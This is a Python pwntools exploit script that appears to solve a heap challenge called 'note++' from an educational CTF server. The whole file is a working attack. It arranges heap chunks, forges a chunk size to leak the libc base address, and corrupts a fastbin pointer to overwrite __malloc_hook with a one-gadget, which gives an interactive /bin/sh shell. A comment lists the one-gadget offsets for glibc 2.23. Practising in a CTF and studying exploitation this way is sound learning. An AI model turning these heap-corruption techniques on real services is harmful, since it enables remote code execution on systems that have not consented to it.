import binascii
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc-2.23.so')

# FIXME: how to have this libc debug info???

p = remote('edu-ctf.csie.org', 10181)
# p = process('./note++', env={"LD_PRELOAD": os.path.join(os.getcwd(), './libc-2.23.so')})
# gdb.attach(p, 'add-symbol-file mockup.o 0\n')
# b menu\n
# p = gdb.debug('./note++', 'b main\n')

# compile mockup.c to get a mocked symbol file

def add(size, body, desc):
    if not body or not desc:
        log.warn('Add note (sz=%d) of empty body or desc!', size)
        return
    p.sendlineafter('>', '1')
    p.sendlineafter('Size:', str(size))
    p.sendafter('Note:', body)
    # desc uses scanf, should end line explicitly; no space in string
    p.sendlineafter('Description of this note:', desc)

def list_all():
    p.sendlineafter('>', '2')

def delete(idx):
    print('Del: %d' % idx)
    p.sendlineafter('>', '3')
    p.sendlineafter('Index', str(idx))

# arrange the heap:
#                         0  1  2     3  4     5  6
for idx, sz in enumerate([0, 0, 0, 0x68, 0, 0x68, 0]):
    print('Add: %d' % idx)
    add(sz, 'AAAA', 'note-#%d' % idx)

# p (struct Note[10])notes

delete(1)
# fake the next block (idx=2)'s size so it ends up
# at unsorted bin, with fd/bk set
add(0, b'A' * 0x18 + p64(0x91), ':)))')
delete(2)

# leaking libc
delete(1)
add(0, b'A' * 0x20, ':)))')

list_all()
p.recvuntil('Data: ' + 'A' * 0x20)
libc_base = u64(p.recv(6) + b'\0\0') - 0x3c4b78
log.success('libc base: %s', hex(libc_base))

# to recover 1st and 2nd by 0th block
delete(0)
layout_orig = [
    0,    0,  # 0th data
    0, 0x21,  # 1st chunk
    0,    0,
    0, 0x91,  # 2nd chunk
]
add(0, b''.join(map(p64, layout_orig)), 'recovered')

# split the unsorted bin (at 2nd) into [0x20, 0x70] chunks
# the latter is 7th, but its buffer locates at 3rd note
add( 0x8, 'AAAA', 'hey-i-am-at-2nd!')
add(0x58, 'BBBB', '7th!')

print('Writing faked fd ptr...')
delete(7)
delete(5)
delete(4)
fd_target = libc_base + libc.symbols[b'__malloc_hook'] - 0x10 - 3
layout_fake_chunk = [
    0,    0,  # 4th data
    0, 0x71,  # 5th chunk
    fd_target, 0,  # 5th fd, bk
]
add(0, b''.join(map(p64, layout_fake_chunk)), '4th-so-evil!!')

print('Writing one-gadget...')
# get back 5th
add(0x68, b'owo', 'owo')
# get fake chunk
add(0x68, b'aaa' + p64(libc_base + 0xf02a4), '5th-write-one-gadget!!!')

'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

# now trigger glibc abort...
# delete(7)

p.interactive()
